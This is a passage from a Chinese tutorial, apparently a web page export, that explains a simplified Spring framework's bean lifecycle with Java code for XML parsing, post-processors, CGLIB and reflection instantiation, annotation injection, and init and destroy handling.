}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\ncreateBeanInstance 使用了 CGLIB 来实例化一个 Bean, 也可以使用 JAVA 自带的反射\n\n    protected Object createBeanInstance(BeanDefinition beanDefinition, String beanName, Object[] args) {\n        Constructor constructorToUse = null;\n        Class<?> beanClass = beanDefinition.getBeanClass();\n        Constructor<?>[] declaredConstructors = beanClass.getDeclaredConstructors();\n        for (Constructor ctor : declaredConstructors) {\n            if (null != args && ctor.getParameterTypes().length == args.length) {\n                constructorToUse = ctor;\n                break;\n            }\n        }\n        return getInstantiationStrategy().instantiate(beanDefinition, beanName, constructorToUse, args);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nCGLIB 实现实例化\n\n@Override\n    public Object instantiate(BeanDefinition beanDefinition, String beanName, Constructor ctor, Object[] args) throws BeansException {\n        Enhancer enhancer = new Enhancer();\n        enhancer.setSuperclass(beanDefinition.getBeanClass());\n        enhancer.setCallback(new NoOp() {\n            @Override\n            public int hashCode() {\n                return super.hashCode();\n            }\n        });\n        if (null == ctor) return enhancer.create();\n        return enhancer.create(ctor.getParameterTypes(), args);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nJAVA 反射实现序列化\n\n    @Override\n    public Object instantiate(BeanDefinition beanDefinition, String beanName, Constructor ctor, Object[] args) throws BeansException {\n        Class clazz = beanDefinition.getBeanClass();\n        try {\n            if (null != ctor) {\n                return clazz.getDeclaredConstructor(ctor.getParameterTypes()).newInstance(args);\n            } else {\n                return clazz.getDeclaredConstructor().newInstance();\n            }\n        } catch (NoSuchMethodException | InstantiationException | IllegalAccessException | InvocationTargetException e) {\n            throw new BeansException("Failed to instantiate [" + clazz.getName() + "]", e);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# 注解属性填充\n\n注解属性，会从之前注册的 BeanPostProcessor 里匹配 InstantiationAwareBeanPostProcessor 的对象，其中默认的 AutowiredAnnotationBeanPostProcessor 具体实现了该类\n\n    protected void applyBeanPostProcessorsBeforeApplyingPropertyValues(String beanName, Object bean, BeanDefinition beanDefinition) {\n        for (BeanPostProcessor beanPostProcessor : getBeanPostProcessors()) {\n            if (beanPostProcessor instanceof InstantiationAwareBeanPostProcessor) {\n                PropertyValues pvs = ((InstantiationAwareBeanPostProcessor) beanPostProcessor).postProcessPropertyValues(beanDefinition.getPropertyValues(), bean, beanName);\n                if (null != pvs) {\n                    for (PropertyValue propertyValue : pvs.getPropertyValues()) {\n                        beanDefinition.getPropertyValues().addPropertyValue(propertyValue);\n                    }\n                }\n            }\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nAutowiredAnnotationBeanPostProcessor 感知注解属性填充\n\n    @Override\n    public PropertyValues postProcessPropertyValues(PropertyValues pvs, Object bean, String beanName) throws BeansException {\n        Class<?> clazz = bean.getClass();\n        clazz = ClassUtils.isCglibProxyClass(clazz) ? clazz.getSuperclass() : clazz;\n        // 获得对象所有字段\n        Field[] declaredFields = clazz.getDeclaredFields();\n        for (Field field : declaredFields) {\n            // @Value 注解\n            Value valueAnnotation = field.getAnnotation(Value.class);\n            if (null != valueAnnotation) {\n                Object value = valueAnnotation.value();\n                // 解析得到值\n                value = beanFactory.resolveEmbeddedValue((String) value);\n                // 类型转换\n                Class<?> sourceType = value.getClass();\n                Class<?> targetType = (Class<?>) TypeUtil.getType(field);\n                // 对值进行转换处理\n                ConversionService conversionService = beanFactory.getConversionService();\n                if (conversionService != null) {\n                    if (conversionService.canConvert(sourceType, targetType)) {\n                        value = conversionService.convert(value, targetType);\n                    }\n                }\n                // 把值设置进去\n                BeanUtil.setFieldValue(bean, field.getName(), value);\n            }\n        }\n        // 2. 处理注解 @Autowired\n        for (Field field : declaredFields) {\n            Autowired autowiredAnnotation = field.getAnnotation(Autowired.class);\n            if (null != autowiredAnnotation) {\n                Class<?> fieldType = field.getType();\n                String dependentBeanName = null;\n                Qualifier qualifierAnnotation = field.getAnnotation(Qualifier.class);\n                Object dependentBean = null;\n                if (null != qualifierAnnotation) {\n                    dependentBeanName = qualifierAnnotation.value();\n                    dependentBean = beanFactory.getBean(dependentBeanName, fieldType);\n                } else {\n                    dependentBean = beanFactory.getBean(fieldType);\n                }\n                BeanUtil.setFieldValue(bean, field.getName(), dependentBean);\n            }\n        }\n        return pvs;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n\n\n\n# XML 属性填充\n\nXML 属性填充这里说过会出现循环依赖的问题，在实例化阶段的前后已经对这个处理了，后续会单独讲解\n\n    protected void applyPropertyValues(String beanName, Object bean, BeanDefinition beanDefinition) {\n        try {\n            PropertyValues propertyValues = beanDefinition.getPropertyValues();\n            for (PropertyValue propertyValue : propertyValues.getPropertyValues()) {\n                String name = propertyValue.getName();\n                Object value = propertyValue.getValue();\n                if (value instanceof BeanReference) {\n                    // A 依赖 B，获取 B 的实例化\n                    BeanReference beanReference = (BeanReference) value;\n                    value = getBean(beanReference.getBeanName());\n                }\n                // 类型转换\n                else {\n                    Class<?> sourceType = value.getClass();\n                    Class<?> targetType = (Class<?>) TypeUtil.getFieldType(bean.getClass(), name);\n                    ConversionService conversionService = getConversionService();\n                    if (conversionService != null) {\n                        if (conversionService.canConvert(sourceType, targetType)) {\n                            value = conversionService.convert(value, targetType);\n                        }\n                    }\n                }\n                // 反射设置属性填充\n                 BeanUtil.setFieldValue(bean, name, value);\n            }\n        } catch (Exception e) {\n            throw new BeansException("Error setting property values：" + beanName + " message：" + e);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n\n# 感知对象\n\n感知对象做为一个扩展接口，只要我们的 Bean 实现了这些接口，就可以为我们的 Bean 提供额外的能力\n\n    private Object initializeBean(String beanName, Object bean, BeanDefinition beanDefinition) {\n        // invokeAwareMethods（感知对象）\n        if (bean instanceof Aware) {\n            if (bean instanceof BeanFactoryAware) {\n                ((BeanFactoryAware) bean).setBeanFactory(this);\n            }\n            if (bean instanceof BeanClassLoaderAware) {\n                ((BeanClassLoaderAware) bean).setBeanClassLoader(getBeanClassLoader());\n            }\n            if (bean instanceof BeanNameAware) {\n                ((BeanNameAware) bean).setBeanName(beanName);\n            }\n        }\n        // 1. 执行 BeanPostProcessor Before 处理\n        Object wrappedBean = applyBeanPostProcessorsBeforeInitialization(bean, beanName);\n        // 执行 Bean 对象的初始化方法\n        try {\n            invokeInitMethods(beanName, wrappedBean, beanDefinition);\n        } catch (Exception e) {\n            throw new BeansException("Invocation of init method of bean[" + beanName + "] failed", e);\n        }\n        // 2. 执行 BeanPostProcessor After 处理\n        wrappedBean = applyBeanPostProcessorsAfterInitialization(wrappedBean, beanName);\n        return wrappedBean;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n\n# 初始化方法之前\n\n在 Bean 的初始化方法之前调用，默认提供了 applicationContext 的上下文注入，当某个类实现了 ApplicationContextAware，就提供 applicationContext 上下文的能力，只是我们要实现的是 ApplicationContextAware ，并不是 BeanPostProcessor\n\n    @Override\n    public Object applyBeanPostProcessorsBeforeInitialization(Object existingBean, String beanName) throws BeansException {\n        Object result = existingBean;\n        for (BeanPostProcessor processor : getBeanPostProcessors()) {\n            Object current = processor.postProcessBeforeInitialization(result, beanName);\n            if (null == current) return result;\n            result = current;\n        }\n        return result;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n    @Override\n    public Object postProcessBeforeInitialization(Object bean, String beanName) throws BeansException {\n        if (bean instanceof ApplicationContextAware){\n            ((ApplicationContextAware) bean).setApplicationContext(applicationContext);\n        }\n        return bean;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# Bean 的初始化方法\n\nBean 初始化方法还是比较简单的，主要是通过判断是否实现 InitializingBean 接口，如果实现了，则调用实例化对象实现的 afterPropertiesSet 方法。如果不是以接口实现的，是以 XML 描述的，则是通过反射的方式调用该方法。\n\n    private void invokeInitMethods(String beanName, Object bean, BeanDefinition beanDefinition) throws Exception {\n        // 1. 实现接口 InitializingBean\n        if (bean instanceof InitializingBean) {\n            ((InitializingBean) bean).afterPropertiesSet();\n        }\n\n        // 2. 注解配置 init-method {判断是为了避免二次执行销毁}\n        String initMethodName = beanDefinition.getInitMethodName();\n        if (StrUtil.isNotEmpty(initMethodName)) {\n            Method initMethod = beanDefinition.getBeanClass().getMethod(initMethodName);\n            if (null == initMethod) {\n                throw new BeansException("Could not find an init method named \'" + initMethodName + "\' on bean with name \'" + beanName + "\'");\n            }\n            initMethod.invoke(bean);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n<bean id="userDao" class="cn.bugstack.springframework.test.bean.UserDao" init-method="initDataMethod" destroy-method="destroyDataMethod"/>\n\n\n1\n\n\n\n# 初始化方法之后\n\n    @Override\n    public Object applyBeanPostProcessorsAfterInitialization(Object existingBean, String beanName) throws BeansException {\n        Object result = existingBean;\n        for (BeanPostProcessor processor : getBeanPostProcessors()) {\n            Object current = processor.postProcessAfterInitialization(result, beanName);\n            if (null == current) return result;\n            result = current;\n        }\n        return result;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 注册销毁事件\n\n销毁事件需要 Bean 实现 DisposableBean 接口并重写 destroy () 方法。如下先是把实现 DisposableBean 或有在 XML 描述过销毁方法的注册到一个容器里。\n\n    protected void registerDisposableBeanIfNecessary(String beanName, Object bean, BeanDefinition beanDefinition) {\n        // 非 Singleton 类型的 Bean 不执行销毁方法\n        if (!beanDefinition.isSingleton()) return;\n        if (bean instanceof DisposableBean || StrUtil.isNotEmpty(beanDefinition.getDestroyMethodName())) {\n            registerDisposableBean(beanName, new DisposableBeanAdapter(bean, beanName, beanDefinition));\n        }\n    }\n\n    public void registerDisposableBean(String beanName, DisposableBean bean) {\n        disposableBeans.put(beanName, bean);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n然后再整个启动过程结束调用 registerShutdownHook 方法添加一个钩子监听。\n\n    @Override\n    public void registerShutdownHook() {\n        // Java 中的一个方法，它用于注册 JVM 关闭时要执行的特定代码块。当 JVM 即将关闭时，这些代码块会被执行，以便进行清理、释放资源等操作。\n        // 这些代码块通常称为“钩子（hook）”，因此该方法也被称为“添加关闭钩子（Add Shutdown Hook）”。\n        Runtime.getRuntime().addShutdownHook(new Thread(this::close));\n    }\n\n    @Override\n    public void close() {\n        // 发布容器关闭事件\n        publishEvent(new ContextClosedEvent(this));\n        // 执行销毁单例bean的销毁方法\n        getBeanFactory().destroySingletons();\n    }\n\n    public void destroySingletons() {\n        Set<String> keySet = this.disposableBeans.keySet();\n        Object[] disposableBeanNames = keySet.toArray();\n\n        for (int i = disposableBeanNames.length - 1; i >= 0; i--) {\n            Object beanName = disposableBeanNames[i];\n            DisposableBean disposableBean = disposableBeans.remove(beanName);\n            try {\n                disposableBean.destroy();\n            } catch (Exception e) {\n                throw new BeansException("Destroy method on bean with name \'" + beanName + "\' threw an exception", e);\n            }\n        }\n    }\n\n    @Override\n    public void destroy() throws Exception {\n        // 1. 实现接口 DisposableBean\n        if (bean instanceof DisposableBean) {\n            ((DisposableBean) bean).destroy();\n        }\n        // 2. 注解配置 destroy-method {判断是为了避免二次执行销毁}\n        if (StrUtil.isNotEmpty(destroyMethodName) && !(bean instanceof DisposableBean && "destroy".equals(this.destroyMethodName))) {\n            Method destroyMethod = bean.getClass().getMethod(destroyMethodName);\n            if (null == destroyMethod) {\n                throw new BeansException("Couldn\'t find a destroy method named \'" + destroyMethodName + "\' on bean with name \'" + beanName + "\'");\n            }\n            destroyMethod.invoke(bean);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n\n\n\n# scop 处理单例\n\n    public void registerSingleton(String beanName, Object singletonObject) {\n        // 三级缓存\n        singletonObjects.put(beanName, singletonObject);\n        // 二级缓存\n        earlySingletonObjects.remove(beanName);\n        // 一级缓存\n        singletonFactories.remove(beanName);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n',normalizedContent:'spring 是 java 开发用到最多的一个 web 框架，核心是 ioc（控制反转）和 aop（面向切面），但做为架构，想要对 spring 要进行扩展等，必须要了解 spring 的生命周期、事件、aop、行为感知等。spring 生命周期如下图：\n\n\n\n提示\n\n本文主要了解 spring 生命周期的有哪些，以及他们的核心代码是怎么编写，整个过程是偏 ioc 和 di 的，ioc 将对象的创建和依赖关系的维护从代码中脱离出来，通过配置读取创建对象；di 从注解属性填充过程以及 xml 属性填充过程为具体的体现。\n\n\n# 读取 xml 文件\n\n通过 classpathxmlapplicationcontext 来读取资源文件下的 spring.xml\n\n    @test\n    public void test() {\n        classpathxmlapplicationcontext applicationcontext = new classpathxmlapplicationcontext("classpath:spring.xml");\n        userservice userservice = applicationcontext.getbean("userservice", userservice.class);\n        system.out.println("测试结果：" + userservice.queryuserinfo());\n    }\n\n\n1\n2\n3\n4\n5\n6\n\n\n根据文件类型使用不同的方式读取到流中\n\n    @override\n    public resource getresource(string location) {\n        assert.notnull(location, "location must not be null");\n        if (location.startswith(classpath_url_prefix)) {\n            return new classpathresource(location.substring(classpath_url_prefix.length()));\n        }\n        else {\n            try {\n                url url = new url(location);\n                return new urlresource(url);\n            } catch (malformedurlexception e) {\n                return new filesystemresource(location);\n            }\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n调用 xml 解析\n\n    @override\n    public void loadbeandefinitions(resource resource) throws beansexception {\n        try {\n            try (inputstream inputstream = resource.getinputstream()) {\n                doloadbeandefinitions(inputstream);\n            }\n        } catch (ioexception | classnotfoundexception | documentexception e) {\n            throw new beansexception("ioexception parsing xml document from " + resource, e);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 封装 beandefinition\n\n解析 xml 的整个过程：\n\n * 解析 dom\n * 解析带有 @component 注解的类，并封装为 beandefinition 注册到 beanfactory\n * 解析不是 component-scan 定义的类\n\n    protected void doloadbeandefinitions(inputstream inputstream) throws classnotfoundexception, documentexception {\n        // 使用 org.dom4j.io 的解析器\n        saxreader reader = new saxreader();\n        document document = reader.read(inputstream);\n        element root = document.getrootelement();\n        // 解析 context:component-scan 标签，扫描包中的类并提取相关信息，用于组装 beandefinition\n        element componentscan = root.element("component-scan");\n        if (null != componentscan) {\n            string scanpath = componentscan.attributevalue("base-package");\n            if (strutil.isempty(scanpath)) {\n                throw new beansexception("the value of base-package attribute can not be empty or null");\n            }\n            // 扫描整个包\n            scanpackage(scanpath);\n        }\n        list<element> beanlist = root.elements("bean");\n        for (element bean : beanlist) {\n            string id = bean.attributevalue("id");\n            string name = bean.attributevalue("name");\n            string classname = bean.attributevalue("class");\n            string initmethod = bean.attributevalue("init-method");\n            string destroymethodname = bean.attributevalue("destroy-method");\n            string beanscope = bean.attributevalue("scope");\n            // 获取 class，方便获取类中的名称\n            class<?> clazz = class.forname(classname);\n            // 优先级 id > name\n            string beanname = strutil.isnotempty(id) ? id : name;\n            if (strutil.isempty(beanname)) {\n                beanname = strutil.lowerfirst(clazz.getsimplename());\n            }\n            // 定义bean\n            beandefinition beandefinition = new beandefinition(clazz);\n            beandefinition.setinitmethodname(initmethod);\n            beandefinition.setdestroymethodname(destroymethodname);\n            if (strutil.isnotempty(beanscope)) {\n                beandefinition.setscope(beanscope);\n            }\n            list<element> propertylist = bean.elements("property");\n            // 读取属性并填充\n            for (element property : propertylist) {\n                // 解析标签：property\n                string attrname = property.attributevalue("name");\n                string attrvalue = property.attributevalue("value");\n                string attrref = property.attributevalue("ref");\n                // 获取属性值：引入对象、值对象\n                object value = strutil.isnotempty(attrref) ? new beanreference(attrref) : attrvalue;\n                // 创建属性信息\n                propertyvalue propertyvalue = new propertyvalue(attrname, value);\n                beandefinition.getpropertyvalues().addpropertyvalue(propertyvalue);\n            }\n            if (getregistry().containsbeandefinition(beanname)) {\n                throw new beansexception("duplicate beanname[" + beanname + "] is not allowed");\n            }\n            // 注册 beandefinition\n            getregistry().registerbeandefinition(beanname, beandefinition);\n        }\n    }\n\n    private void scanpackage(string scanpath) {\n        string[] basepackages = strutil.splittoarray(scanpath, \',\');\n        classpathbeandefinitionscanner scanner = new classpathbeandefinitionscanner(getregistry());\n        scanner.doscan(basepackages);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n\n\n根据提供路径封装为 beandefinition 并注册到 beanfactory\n\n    public void doscan(string... basepackages) {\n        for (string basepackage : basepackages) {\n            set<beandefinition> candidates = findcandidatecomponents(basepackage);\n            for (beandefinition beandefinition : candidates) {\n                // 解析 bean 的作用域 singleton、prototype\n                string beanscope = resolvebeanscope(beandefinition);\n                if (strutil.isnotempty(beanscope)) {\n                    beandefinition.setscope(beanscope);\n                }\n                registry.registerbeandefinition(determinebeanname(beandefinition), beandefinition);\n            }\n        }\n\n        // 注册处理注解的 beanpostprocessor(@autowired、@value)\n        registry.registerbeandefinition("cn.bugstack.springframework.context.annotation.internalautowiredannotationprocessor", new beandefinition(autowiredannotationbeanpostprocessor.class));\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n对提供的包路径扫描有 @component 注解的类\n\n    public set<beandefinition> findcandidatecomponents(string basepackage) {\n        set<beandefinition> candidates = new linkedhashset<>();\n        set<class<?>> classes = classutil.scanpackagebyannotation(basepackage, component.class);\n        for (class<?> clazz : classes) {\n            candidates.add(new beandefinition(clazz));\n        }\n        return candidates;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# beanfactorypostprocessor\n\nbeanfactorypostprocessor 可以修改我们对 beandefinition 定义的所有信息，可以添加属性，修改属性，添加额外的方法等。具体会对所有实现 beanfactorypostprocessor 的类进行获取，并循环调用 postprocessbeanfactory 方法\n\n    private void invokebeanfactorypostprocessors(configurablelistablebeanfactory beanfactory) {\n        map<string, beanfactorypostprocessor> beanfactorypostprocessormap = beanfactory.getbeansoftype(beanfactorypostprocessor.class);\n        for (beanfactorypostprocessor beanfactorypostprocessor : beanfactorypostprocessormap.values()) {\n            beanfactorypostprocessor.postprocessbeanfactory(beanfactory);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n\n\n提供一个默认的实现\n\n    @override\n    public void postprocessbeanfactory(configurablelistablebeanfactory beanfactory) throws beansexception {\n        try {\n            // 加载属性文件\n            defaultresourceloader resourceloader = new defaultresourceloader();\n            resource resource = resourceloader.getresource(location);\n\n            // 把属性文件的内容加载到properties里组成键值对\n            properties properties = new properties();\n            properties.load(resource.getinputstream());\n            string[] beandefinitionnames = beanfactory.getbeandefinitionnames();\n            for (string beanname : beandefinitionnames) {\n                beandefinition beandefinition = beanfactory.getbeandefinition(beanname);\n                propertyvalues propertyvalues = beandefinition.getpropertyvalues();\n                for (propertyvalue propertyvalue : propertyvalues.getpropertyvalues()) {\n                    object value = propertyvalue.getvalue();\n                    if (!(value instanceof string)) continue;\n                    value = resolveplaceholder((string) value, properties);\n                    propertyvalues.addpropertyvalue(new propertyvalue(propertyvalue.getname(), value));\n                }\n            }\n            // 向容器中添加字符串解析器，供解析@value注解使用\n            stringvalueresolver valueresolver = new placeholderresolvingstringvalueresolver(properties);\n            // 注册到容器，以便后续使用\n            beanfactory.addembeddedvalueresolver(valueresolver);\n        } catch (ioexception e) {\n            throw new beansexception("could not load properties", e);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n\n# 注册实现 beanpostprocessor 的类\n\nbeanpostprocessor 就是提供了 postprocessbeforeinitialization，postprocessafterinitialization 两种方法，提供我们在实例化 bean 的时候，所有实现 beanpostprocessor 的类，注册到 list<beanpostprocessor> beanpostprocessors = new arraylist<beanpostprocessor>(); 中\n\n    private void registerbeanpostprocessors(configurablelistablebeanfactory beanfactory) {\n        map<string, beanpostprocessor> beanpostprocessormap = beanfactory.getbeansoftype(beanpostprocessor.class);\n        for (beanpostprocessor beanpostprocessor : beanpostprocessormap.values()) {\n            beanfactory.addbeanpostprocessor(beanpostprocessor);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 实例化 bean\n\n    protected <t> t dogetbean(final string name, final object[] args) {\n        // 从缓存中获取实例\n        object sharedinstance = getsingleton(name);\n        if (sharedinstance != null) {\n            // 如果实现了 factorybean，则需要调用 factorybean##getobject\n            return (t) getobjectforbeaninstance(sharedinstance, name);\n        }\n        // 从beandefinition列表中获取对象\n        beandefinition beandefinition = getbeandefinition(name);\n        object bean = createbean(name, beandefinition, args);\n        // 如果实现了 factorybean，则需要调用 factorybean##getobject\n        return (t) getobjectforbeaninstance(bean, name);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n实例化 bean 的具体方法\n\n    protected object docreatebean(string beanname, beandefinition beandefinition, object[] args) {\n        object bean = null;\n        try {\n            // 实例化 bean\n            bean = createbeaninstance(beandefinition, beanname, args);\n            // 处理循环依赖，将实例化后的bean对象提前放入缓存中暴露出来\n            if (beandefinition.issingleton()) {\n                object finalbean = bean;\n                addsingletonfactory(beanname, () -> getearlybeanreference(beanname, beandefinition, finalbean));\n            }\n            // 是否需要继续进行后续的属性填充\n            boolean continuewithpropertypopulation = applybeanpostprocessorsafterinstantiation(beanname, bean);\n            if (!continuewithpropertypopulation) {\n                return bean;\n            }\n            // 在设置 bean 属性之前，允许 beanpostprocessor 修改属性值（注解属性填充）\n            applybeanpostprocessorsbeforeapplyingpropertyvalues(beanname, bean, beandefinition);\n            // 给 bean 填充属性（xml属性填充）\n            applypropertyvalues(beanname, bean, beandefinition);\n            // 执行 bean 的初始化方法和 beanpostprocessor 的前置和后置处理方法\n            bean = initializebean(beanname, bean, beandefinition);\n        } catch (exception e) {\n            throw new beansexception("instantiation of bean failed", e);\n        }\n        // 注册实现了 disposablebean 接口的 bean 对象\n        registerdisposablebeanifnecessary(beanname, bean, beandefinition);\n        // 判断 scope_singleton、scope_prototype\n        object exposedobject = bean;\n        if (beandefinition.issingleton()) {\n            // 获取代理对象\n            exposedobject = getsingleton(beanname);\n            registersingleton(beanname, exposedobject);\n        }\n        return exposedobject;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\ncreatebeaninstance 使用了 cglib 来实例化一个 bean, 也可以使用 java 自带的反射\n\n    protected object createbeaninstance(beandefinition beandefinition, string beanname, object[] args) {\n        constructor constructortouse = null;\n        class<?> beanclass = beandefinition.getbeanclass();\n        constructor<?>[] declaredconstructors = beanclass.getdeclaredconstructors();\n        for (constructor ctor : declaredconstructors) {\n            if (null != args && ctor.getparametertypes().length == args.length) {\n                constructortouse = ctor;\n                break;\n            }\n        }\n        return getinstantiationstrategy().instantiate(beandefinition, beanname, constructortouse, args);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\ncglib 实现实例化\n\n@override\n    public object instantiate(beandefinition beandefinition, string beanname, constructor ctor, object[] args) throws beansexception {\n        enhancer enhancer = new enhancer();\n        enhancer.setsuperclass(beandefinition.getbeanclass());\n        enhancer.setcallback(new noop() {\n            @override\n            public int hashcode() {\n                return super.hashcode();\n            }\n        });\n        if (null == ctor) return enhancer.create();\n        return enhancer.create(ctor.getparametertypes(), args);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\njava 反射实现序列化\n\n    @override\n    public object instantiate(beandefinition beandefinition, string beanname, constructor ctor, object[] args) throws beansexception {\n        class clazz = beandefinition.getbeanclass();\n        try {\n            if (null != ctor) {\n                return clazz.getdeclaredconstructor(ctor.getparametertypes()).newinstance(args);\n            } else {\n                return clazz.getdeclaredconstructor().newinstance();\n            }\n        } catch (nosuchmethodexception | instantiationexception | illegalaccessexception | invocationtargetexception e) {\n            throw new beansexception("failed to instantiate [" + clazz.getname() + "]", e);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# 注解属性填充\n\n注解属性，会从之前注册的 beanpostprocessor 里匹配 instantiationawarebeanpostprocessor 的对象，其中默认的 autowiredannotationbeanpostprocessor 具体实现了该类\n\n    protected void applybeanpostprocessorsbeforeapplyingpropertyvalues(string beanname, object bean, beandefinition beandefinition) {\n        for (beanpostprocessor beanpostprocessor : getbeanpostprocessors()) {\n            if (beanpostprocessor instanceof instantiationawarebeanpostprocessor) {\n                propertyvalues pvs = ((instantiationawarebeanpostprocessor) beanpostprocessor).postprocesspropertyvalues(beandefinition.getpropertyvalues(), bean, beanname);\n                if (null != pvs) {\n                    for (propertyvalue propertyvalue : pvs.getpropertyvalues()) {\n                        beandefinition.getpropertyvalues().addpropertyvalue(propertyvalue);\n                    }\n                }\n            }\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nautowiredannotationbeanpostprocessor 感知注解属性填充\n\n    @override\n    public propertyvalues postprocesspropertyvalues(propertyvalues pvs, object bean, string beanname) throws beansexception {\n        class<?> clazz = bean.getclass();\n        clazz = classutils.iscglibproxyclass(clazz) ? clazz.getsuperclass() : clazz;\n        // 获得对象所有字段\n        field[] declaredfields = clazz.getdeclaredfields();\n        for (field field : declaredfields) {\n            // @value 注解\n            value valueannotation = field.getannotation(value.class);\n            if (null != valueannotation) {\n                object value = valueannotation.value();\n                // 解析得到值\n                value = beanfactory.resolveembeddedvalue((string) value);\n                // 类型转换\n                class<?> sourcetype = value.getclass();\n                class<?> targettype = (class<?>) typeutil.gettype(field);\n                // 对值进行转换处理\n                conversionservice conversionservice = beanfactory.getconversionservice();\n                if (conversionservice != null) {\n                    if (conversionservice.canconvert(sourcetype, targettype)) {\n                        value = conversionservice.convert(value, targettype);\n                    }\n                }\n                // 把值设置进去\n                beanutil.setfieldvalue(bean, field.getname(), value);\n            }\n        }\n        // 2. 处理注解 @autowired\n        for (field field : declaredfields) {\n            autowired autowiredannotation = field.getannotation(autowired.class);\n            if (null != autowiredannotation) {\n                class<?> fieldtype = field.gettype();\n                string dependentbeanname = null;\n                qualifier qualifierannotation = field.getannotation(qualifier.class);\n                object dependentbean = null;\n                if (null != qualifierannotation) {\n                    dependentbeanname = qualifierannotation.value();\n                    dependentbean = beanfactory.getbean(dependentbeanname, fieldtype);\n                } else {\n                    dependentbean = beanfactory.getbean(fieldtype);\n                }\n                beanutil.setfieldvalue(bean, field.getname(), dependentbean);\n            }\n        }\n        return pvs;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n\n\n\n# xml 属性填充\n\nxml 属性填充这里说过会出现循环依赖的问题，在实例化阶段的前后已经对这个处理了，后续会单独讲解\n\n    protected void applypropertyvalues(string beanname, object bean, beandefinition beandefinition) {\n        try {\n            propertyvalues propertyvalues = beandefinition.getpropertyvalues();\n            for (propertyvalue propertyvalue : propertyvalues.getpropertyvalues()) {\n                string name = propertyvalue.getname();\n                object value = propertyvalue.getvalue();\n                if (value instanceof beanreference) {\n                    // a 依赖 b，获取 b 的实例化\n                    beanreference beanreference = (beanreference) value;\n                    value = getbean(beanreference.getbeanname());\n                }\n                // 类型转换\n                else {\n                    class<?> sourcetype = value.getclass();\n                    class<?> targettype = (class<?>) typeutil.getfieldtype(bean.getclass(), name);\n                    conversionservice conversionservice = getconversionservice();\n                    if (conversionservice != null) {\n                        if (conversionservice.canconvert(sourcetype, targettype)) {\n                            value = conversionservice.convert(value, targettype);\n                        }\n                    }\n                }\n                // 反射设置属性填充\n                 beanutil.setfieldvalue(bean, name, value);\n            }\n        } catch (exception e) {\n            throw new beansexception("error setting property values：" + beanname + " message：" + e);\n        }\n    